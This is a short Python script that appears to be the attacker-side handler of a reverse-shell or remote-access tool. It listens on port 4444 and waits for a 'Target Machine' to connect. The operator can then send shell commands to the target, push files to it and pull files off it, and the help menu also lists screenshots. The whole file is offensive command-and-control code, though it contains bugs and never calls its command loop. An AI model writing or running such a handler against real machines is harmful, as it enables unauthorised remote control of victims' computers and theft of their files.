import os
import socket
import json
from termcolor import colored

#Funcionalities

def upload_file(file):
    f = open(file, 'rb')
    target.send(f.read())

def down_file(file):
    f = open(file, 'wb')
    target.settimeout(5)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close
def data_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())
def t_commun():
    count = 0
    while True:
        command = input('* Shell ~%s: ' % str(ip))
        data_send(command)
        if command == 'exit':
            break
        elif command == 'clear':
            os.system('clear')
        elif command [:3] == 'cd ':
            pass
        elif command [:6] == 'upload ':
            upload_file(command[7:])
        elif command [:8] == 'download':
            down_file(command[9:])
        elif command == 'help':
            print(colored('''\n
                          exit: Close the session on the Target Machine.
                          clear: Clean the screen from the Terminal
                          cd + <directory_name>: Change the Directory on the Target Machine.
                          upload + <file_name>: Send a file to the Target Machine.
                          download + <file_name>: Download a file from the Target Machine.
                          screenshot: Takes a screenshot from the Target Machine.
                          help: Show this Menu LMAO.
                          ''',  'grey'))




sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.100.201', 4444))
print(colored('Waiting for connections[...]', 'red'))
sock.listen(5)

target, ip = sock.accept()
print(colored('+ Connected with: ' + str(ip), 'green'))
